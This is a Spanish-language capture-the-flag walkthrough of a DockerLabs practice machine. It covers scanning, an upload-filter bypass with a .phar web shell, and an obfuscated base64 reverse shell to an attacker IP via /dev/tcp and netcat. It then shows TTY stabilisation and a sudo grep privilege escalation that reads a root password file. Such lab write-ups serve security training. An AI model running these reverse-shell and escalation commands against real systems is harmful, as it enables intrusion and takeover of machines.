# Maquina DockerLabs - DockerLabs.es

![alt text](ImagenesMaquinaDockerLabs/image.png)

Verificar que la maquina este desplegada correctamente

![alt text](ImagenesMaquinaDockerLabs/image-1.png)

Realizamos un ping a la máquina para verificar la comunicación y confirmamos que la conexión es exitosa.

![alt text](ImagenesMaquinaDockerLabs/image-2.png)

A continuación, realizamos un escaneo de la IP utilizando Nmap.

![alt text](ImagenesMaquinaDockerLabs/image-3.png)

Observamos que el puerto 80 esta abierto. Ahora realizamos un escaneo adicional para detectar, enumerar servicios y versiones.

![alt text](ImagenesMaquinaDockerLabs/image-4.png)

En este caso, nos centraremos en el puerto 80 el unico que esta abierto y ejecuta un servicio HTTP mediante Apache httpd 2.4.58. Accederemos a la página web alojada en esta máquina utilizando un navegador.

![alt text](ImagenesMaquinaDockerLabs/image-5.png)

Al aplicar Fuzzing para descubrir rutas y archivos con extensiones como .php, .html, entre otras, obtendremos los siguientes resultados:

![alt text](ImagenesMaquinaDockerLabs/image-6.png)

Al acceder al archivo machine.php, encontraremos una página web que permite la subida de archivos.

![alt text](ImagenesMaquinaDockerLabs/image-7.png)

Realizaremos una prueba subiendo una foto para observar qué sucede.

![alt text](ImagenesMaquinaDockerLabs/image-8.png)

Observamos que solo se permiten archivos con la extensión .zip. Realizaremos una prueba subiendo un archivo .zip y confirmamos que la carga se completa correctamente.

![alt text](ImagenesMaquinaDockerLabs/image-9.png)

Recuerda que también encontramos la ruta /uploads. Al visitarla, observamos que aquí se almacenan los archivos .zip que hemos subido.

![alt text](ImagenesMaquinaDockerLabs/image-10.png)

Con base en lo anterior, intentaremos subir un archivo que contenga código PHP para ejecutar comandos a nivel del sistema.

Después de varios intentos para eludir la validación, descubrí que un archivo con la extensión .phar podría ser una solución viable. Un archivo .phar es similar a un archivo .zip o .tar, pero está diseñado específicamente para contener archivos PHP y otros recursos relacionados.

Creé un archivo llamado pwned.phar que incluye el siguiente código, lo cual nos permite ejecutar comandos del sistema al enviar un parámetro llamado cmd, en el cual inyectamos los comandos que deseamos ejecutar.

![alt text](ImagenesMaquinaDockerLabs/image-11.png)

Subiremos el archivo .phar y confirmaremos que se ha cargado correctamente.

![alt text](ImagenesMaquinaDockerLabs/image-12.png)

Ahora, si cargamos el archivo .phar y enviamos comandos a través del parámetro cmd, podremos ejecutar dichos comandos con éxito.

![alt text](ImagenesMaquinaDockerLabs/image-13.png)

Ahora, necesitamos enviar una shell inversa a nuestra máquina atacante.

Primero, convertimos la shell inversa a Base64 utilizando el siguiente comando:

`echo "sh -i >& /dev/tcp/172.16.1.131/4444 0>&1" | base64`

Esto nos dará el siguiente resultado: `c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjEuMTMxLzQ0NDQgMD4mMQo=`.

![alt text](ImagenesMaquinaDockerLabs/image-14.png)

En nuestra máquina atacante, nos ponemos a la escucha con Netcat en el puerto 4444 utilizando el siguiente comando:

`nc -nvlp 4444`

![alt text](ImagenesMaquinaDockerLabs/image-15.png)

Luego, en el parámetro cmd, enviamos el siguiente comando:

`echo "c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjEuMTMxLzQ0NDQgMD4mMQo=" | base64 -d | bash`

Al ejecutar esto, obtendremos una shell inversa en nuestra máquina atacante. Así, estaremos dentro del sistema.

## Tratamiento de la TTY

**Para trabajar de manera mas cómoda haremos lo siguiente:**
Una vez estemos dentro ejecutamos el siguiente comando: `script /dev/null -c bash`

Luego presionamos: `Ctrl + Z` para suspender el proceso

A continuación, escribimos: `stty raw -echo; fg`

Despues ingresamos: `reset`

Cuando se nos pregunte: "Terminal type?" Ingresamos `xterm`.

Finalmente, exportamos las siguientes variables de entorno: `export TERM=xterm` `export SHELL=bash`

Y listo!

## Escalada de Privilegios

Al ejecutar `sudo -l`, veremos que podemos ejecutar los binarios `/usr/bin/cut` y `/usr/bin/grep` como usuario root sin necesidad de proporcionar una contraseña.

![alt text](ImagenesMaquinaDockerLabs/image-16.png)

Si realizamos una búsqueda de archivos .txt en el sistema utilizando el comando:

`find / *.txt 2>/dev/null`

veremos que hay un archivo en /opt/ llamado nota.txt.

![alt text](ImagenesMaquinaDockerLabs/image-17.png)

Al revisar el contenido de ese archivo, encontramos el siguiente mensaje:

Protege la clave de root, se encuentra en su directorio `/root/clave.txt`. Menos mal que nadie tiene permisos para acceder a ella.

![alt text](ImagenesMaquinaDockerLabs/image-18.png)

Al intentar leer el archivo `/root/clave.txt`, descubrimos que no tenemos permisos para acceder a él.

![alt text](ImagenesMaquinaDockerLabs/image-19.png)

Sin embargo, recordemos que tenemos permisos para ejecutar los binarios grep y cut. Aprovecharemos estos permisos para leer el archivo `/root/clave.txt` de la siguiente manera:

`sudo /usr/bin/grep '' /root/clave.txt`

![alt text](ImagenesMaquinaDockerLabs/image-20.png)

Al leer el archivo, encontramos una posible contraseña: `dockerlabsmolamogollon123`.

Al intentar cambiar al usuario root y utilizar esta contraseña, logramos acceder con éxito y ahora somos root.

![alt text](ImagenesMaquinaDockerLabs/image-21.png)
